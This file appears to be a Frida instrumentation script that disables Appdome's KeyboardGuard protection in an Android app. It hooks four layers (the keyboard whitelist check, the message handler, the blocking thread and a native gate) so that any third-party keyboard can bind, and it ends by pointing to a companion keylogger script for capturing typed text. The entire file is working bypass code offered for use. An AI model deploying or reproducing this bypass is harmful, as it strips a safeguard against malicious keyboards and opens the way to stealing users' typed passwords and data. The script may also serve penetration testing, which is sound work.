/*
 * bypass_a1_keyboardguard.js — Defeat Appdome KeyboardGuard (A1)
 *
 * Target mechanism (KeyboardGuard.java):
 *   initializeKeyboardGuard() → replaces IMM$H.mCallback with KeyboardGuardHookHandler
 *   On MSG_BIND of a non-system IME:
 *     1. isIllegalKeyboard(imeId)          — whitelist gate
 *     2. NativeBridge.shouldBlockEvent()   — native gate
 *     3. KeyboardGuardThread.run()         — DoS loop (finishInputLocked every 300-1000ms)
 *        + showInputMethodPicker()         — force picker dialog
 *
 * Bypass strategy: cut all four layers with surgical hooks. Each hook fires and
 * logs what it intercepted, so the script doubles as evidence output.
 *
 * On Android 15 the mCallback write already silently fails (confirmed by
 * diag_a1_keyboardguard.js). These hooks defeat the protection both on Android
 * 15 (where it never installs) AND on any older version where it does install.
 *
 * Run:
 *   frida -U -n Gadget -l scripts/bypass_a1_keyboardguard.js
 */

Java.perform(function () {
    let KG, KGHH, KGT, NB;
    try {
        KG   = Java.use("runtime.keyboardGuard.KeyboardGuard");
        KGHH = Java.use("runtime.keyboardGuard.KeyboardGuard$KeyboardGuardHookHandler");
        KGT  = Java.use("runtime.keyboardGuard.KeyboardGuard$KeyboardGuardThread");
        NB   = Java.use("runtime.loading.NativeBridge");
    } catch (e) {
        console.log("[!!] class resolution failed: " + e);
        return;
    }

    // Layer 1 — Whitelist gate: isIllegalKeyboard(String) → false
    // Effect: every IME is considered legal; the handler never enters blocking logic.
    try {
        KG.isIllegalKeyboard.implementation = function (imeId) {
            console.log("[BYPASS] isIllegalKeyboard(\"" + imeId + "\") -> forced false (IME allowed)");
            return false;
        };
        console.log("[+] Layer 1: isIllegalKeyboard neutralised");
    } catch (e) { console.log("[-] isIllegalKeyboard: " + e); }

    // Layer 2 — Handler callback: handleMessage no-op
    // Effect: even if mCallback IS installed, the handler returns immediately without
    // calling isIllegalKeyboard, spawning the thread, or showing the picker.
    try {
        KGHH.handleMessage.implementation = function (msg) {
            const NAMES = {2: "MSG_BIND(2)", 4: "MSG_SET_ACTIVE(4)", 9: "MSG_USER_ACTION(9)"};
            const name = NAMES[msg.what.value] || "MSG_OTHER(" + msg.what.value + ")";
            console.log("[BYPASS] handleMessage " + name + " -> intercepted, no-op'd");
            return false; // must return false to let IMM handle the message normally
        };
        console.log("[+] Layer 2: KeyboardGuardHookHandler.handleMessage no-op'd");
    } catch (e) { console.log("[-] handleMessage: " + e); }

    // Layer 3 — DoS thread: KeyboardGuardThread.run() → immediate return
    // Effect: even if the thread spawns, the finishInputLocked loop never runs.
    try {
        KGT.run.implementation = function () {
            console.log("[BYPASS] KeyboardGuardThread.run() -> killed before DoS loop");
        };
        console.log("[+] Layer 3: KeyboardGuardThread.run kill");
    } catch (e) { console.log("[-] KeyboardGuardThread.run: " + e); }

    // Layer 4 — Native gate: NativeBridge.shouldBlockEvent → false (keyboard only)
    // Effect: even if the native runtime would approve blocking, it is overruled.
    try {
        NB.shouldBlockEvent.implementation = function (eventId) {
            if (eventId === "b96e7a45095f5ed683d3169f4c7196ee") {
                console.log("[BYPASS] NativeBridge.shouldBlockEvent KEYBOARD -> forced false");
                return false;
            }
            return this.shouldBlockEvent(eventId); // pass other events through unchanged
        };
        console.log("[+] Layer 4: NativeBridge.shouldBlockEvent (keyboard) bypassed");
    } catch (e) { console.log("[-] shouldBlockEvent: " + e); }

    console.log("\n[*] === KeyboardGuard bypass active (all 4 layers cut) ===");
    console.log("[*] Any third-party IME (AnySoftKeyboard, etc.) will now bind freely.");
    console.log("[*] Load demo_a1_keylogger.js alongside this script to capture typed text.\n");
});
